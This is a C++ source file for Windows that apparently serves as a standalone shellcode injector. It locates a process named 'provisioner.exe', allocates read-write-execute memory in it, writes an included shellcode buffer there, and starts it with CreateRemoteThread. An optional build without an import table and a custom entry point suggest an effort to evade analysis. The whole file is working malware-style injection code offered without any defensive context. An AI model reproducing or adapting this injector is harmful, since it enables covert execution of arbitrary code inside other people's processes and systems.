#include <windows.h>
#include <tlhelp32.h>

#include <cstdint>

#ifdef codeinjector_WITHOUT_IMPORT_TABLE
#include <fakekernel32.h>
#endif

/// This enums represents possible errors to hide it from others
/// useful for debugging
enum class InjectionResult : uint8_t {
    Success,
    CreateToolhelp32SnapshotFailed,
    ProcessNotFound,
    OpenProcessFailed,
    VirtualAllocExFailed,
    WriteProcessMemoryFailed,
    CreateRemoteThreadFailed,
    WaitForSingleObjectFailed,
    GetExitCodeThreadFailed,
};

/// Represents owned `HANDLE`, must be valid!
class Handle {
private:
    HANDLE handle;
public:
    explicit Handle(HANDLE handle) : handle(handle) {}

    HANDLE raw() {
        return handle;
    }

    ~Handle() {
        CloseHandle(handle);
    }
};

/// Represents owned memory created by `VirtualAllocEx`, must be valid!
class ProcessMemory {
private:
    HANDLE hProcess;
    LPVOID address;
public:
    explicit ProcessMemory(HANDLE hProcess, LPVOID address) : hProcess(hProcess), address(address) {}

    HANDLE raw() {
        return address;
    }

    template<const size_t N>
    constexpr bool write(const uint8_t (&buffer)[N]) {
        SIZE_T written = 0;
        return WriteProcessMemory(hProcess, address, (LPCVOID) buffer, sizeof(buffer), &written) &&
               written == sizeof(buffer);
    }

    ~ProcessMemory() {
        VirtualFreeEx(hProcess, address, 0, MEM_RELEASE);
    }
};

#pragma code_seg(".text")

#include <shellcode.h>

__declspec(align(1), allocate(".text")) const wchar_t processName[] = L"provisioner.exe";

extern "C" /*DWORD*/ InjectionResult mainCRTStartup() {
    DWORD processId;

    {
        HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (hSnapshot == INVALID_HANDLE_VALUE) {
            return InjectionResult::CreateToolhelp32SnapshotFailed;
        }

        Handle hSnapshotOwned = Handle(hSnapshot);

        PROCESSENTRY32W processEntry;
        //TODO: check that it is really unnecessary
        //ZeroMemory(&processEntry, sizeof(processEntry));
        processEntry.dwSize = sizeof(processEntry);

        processId = 0;
        while (Process32NextW(hSnapshotOwned.raw(), &processEntry)) {
            //TODO: better way to cmp memory
            if (!lstrcmpW(processEntry.szExeFile, processName)) {
                processId = processEntry.th32ProcessID;
                break;
            }
        }

        if (processId == 0) {
            return InjectionResult::ProcessNotFound;
        }
    }

    //drop hSnapshotOwned

    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processId);
    if (!hProcess) {
        return InjectionResult::OpenProcessFailed;
    }

    Handle hProcessOwned = Handle(hProcess);

    LPVOID address = VirtualAllocEx(hProcessOwned.raw(), nullptr, sizeof(shellcode),
                                    MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!address) {
        return InjectionResult::VirtualAllocExFailed;
    }

    ProcessMemory memoryOwned = ProcessMemory(hProcessOwned.raw(), address);
    if (!memoryOwned.write(shellcode)) {
        return InjectionResult::WriteProcessMemoryFailed;
    }

    HANDLE hThread = CreateRemoteThread(hProcessOwned.raw(), nullptr, 0,
                                        (LPTHREAD_START_ROUTINE) memoryOwned.raw(), nullptr, 0, nullptr);
    if (!hThread) {
        return InjectionResult::CreateRemoteThreadFailed;
    }

    Handle hThreadOwned = Handle(hThread);
    if (WaitForSingleObject(hThreadOwned.raw(), INFINITE) == WAIT_FAILED) {
        return InjectionResult::WaitForSingleObjectFailed;
    }

    DWORD exitCode;
    if (GetExitCodeThread(hThreadOwned.raw(), &exitCode) && exitCode == EXIT_SUCCESS) {
        return InjectionResult::Success;
    } else {
        return InjectionResult::GetExitCodeThreadFailed;
    }
}
